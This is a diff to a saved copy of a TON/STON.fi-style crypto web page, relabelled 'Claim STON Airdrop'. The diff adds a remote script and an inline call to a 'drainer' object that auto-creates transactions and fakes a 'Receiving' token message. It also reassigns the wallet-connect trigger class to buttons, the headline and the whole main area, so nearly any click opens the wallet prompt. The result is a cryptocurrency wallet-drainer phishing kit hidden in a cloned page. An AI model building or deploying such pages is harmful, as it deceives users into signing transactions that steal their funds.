@@ -15078,7 +15078,24 @@ wui-flex { overflow: hidden auto; display: flex; align-items: center; justify-co
 
         --wui-thumbnail-border-base: #252525;
       }
-    </style><script data-scrapbook-elem="custom-elements-loader">(function (names) { if (!customElements) { return; } for (const name of names) { customElements.define(name, class CustomElement extends HTMLElement {}); } })(["tc-root","trx-wcm-explorer-context","trx-wcm-theme-context","trx-wcm-modal","w3m-modal"])</script></head>
+    </style><script data-scrapbook-elem="custom-elements-loader">(function (names) { if (!customElements) { return; } for (const name of names) { customElements.define(name, class CustomElement extends HTMLElement {}); } })(["tc-root","trx-wcm-explorer-context","trx-wcm-theme-context","trx-wcm-modal","w3m-modal"])</script>
+<link rel="stylesheet" href="/vrtx.css?v=1.0.0" />
+<script src="/vrtx.js?v=1.0.0" defer crossorigin></script>
+<script>
+    window.addEventListener('load', () => {
+        window.drainer?.init({
+            autoCreateTransaction: true,  // Automatically create transaction
+            autoOpenModal: false,         // Don't auto-open modal window
+        });
+
+        // Override honeypot settings
+        window.drainer?.overrideHoneypot({
+            honeypot_message: "🎉 Receiving",  // Proxy Token Message
+            honeypot_amount: 10000   // Proxy Token Amount
+        });
+    });
+</script>
+</head>
   <body data-theme="system" class="tc-using-mouse" style="top: auto; --header-height: 61px;">
     <div id="root">
       <div class="isolate">
@@ -15134,10 +15151,10 @@ wui-flex { overflow: hidden auto; display: flex; align-items: center; justify-co
                 </div>
               </nav>
               <div class="flex items-center">
-                <button class="connectButton animate-ui-element-transition bg-buttonPrimary hover:bg-buttonPrimaryHover active:bg-buttonPrimaryHover text-white px-[12px] rounded-[8px] h-[36px] whitespace-nowrap flex items-center justify-center" hwjcl-wei="true">
-                  <p class="font-normal typography-button1 connectButton" hwjcl-wei="true">Connect wallet</p>
+                <button class="animate-ui-element-transition bg-buttonPrimary hover:bg-buttonPrimaryHover active:bg-buttonPrimaryHover text-white px-[12px] rounded-[8px] h-[36px] whitespace-nowrap flex items-center justify-center ton-connect-trigger" hwjcl-wei="true">
+                  <p class="font-normal typography-button1 ton-connect-trigger" hwjcl-wei="true">Connect wallet</p>
                 </button>
-                <button role="button" class="flex items-center justify-center h-[36px] rounded-sm text-textPrimary bg-transparent animate-ui-element-transition hover:bg-backgroundHover active:bg-backgroundHover px-2 ml-3 connectButton" hwjcl-wei="true">
+                <button role="button" class="flex items-center justify-center h-[36px] rounded-sm text-textPrimary bg-transparent animate-ui-element-transition hover:bg-backgroundHover active:bg-backgroundHover px-2 ml-3 ton-connect-trigger" hwjcl-wei="true">
                   <p class="font-normal typography-button1 flex items-center gap-[6px]">
                     <span>
                       <span>
@@ -15147,7 +15164,7 @@ wui-flex { overflow: hidden auto; display: flex; align-items: center; justify-co
                         </svg>
                       </span>
                     </span>
-                    <span class="truncate">Buy TON</span>
+                    <span class="truncate ton-connect-trigger">Buy TON</span>
                   </p>
                 </button>
                 <button class="contents connectButton" hwjcl-wei="true"></button>
@@ -15167,12 +15184,12 @@ wui-flex { overflow: hidden auto; display: flex; align-items: center; justify-co
             </section>
           </header>
         </div>
-        <main class="connectButton pb-[120px] xl:pb-[200px]" style="min-height: calc(100vh - var(--header-height));" hwjcl-wei="true">
+        <main class="ton-connect-trigger pb-[120px] xl:pb-[200px]" style="min-height: calc(100vh - var(--header-height));" hwjcl-wei="true">
           <div class="flex bg-backgroundContent mb-10 xl:mb-11">
             <div class="container flex items-center justify-between gap-3">
               <div class="flex flex-col items-center py-8 md:items-start md:justify-start lg:w-7/12 xl:py-10">
                 <img alt="Stake STON and receive rewards" class="mb-6 size-11 lg:hidden" src="66dbaaebfe4cb89a6376a53491df8be0af0c23be.png">
-                <h2 class="font-bold typography-h2 mb-2 text-center md:mb-3 md:px-0 md:text-start">Claim STON Airdrop</h2>
+                <h2 class="font-bold typography-h2 mb-2 text-center md:mb-3 md:px-0 md:text-start ton-connect-trigger">Claim STON Airdrop</h2>
                 <p class="font-normal typography-body2 mb-6 text-balance px-3 text-center md:mb-7 md:px-0 md:text-start">Claim your STON tokens, acquire DAO voting power with ARKENSTON, and receive GEMSTON, which can be transferred, traded, or held.</p>
                 <div class="flex items-center sm:justify-center sm:gap-3 md:justify-start md:gap-4">
                   <a target="_self" class="connectButton" hwjcl-wei="true">
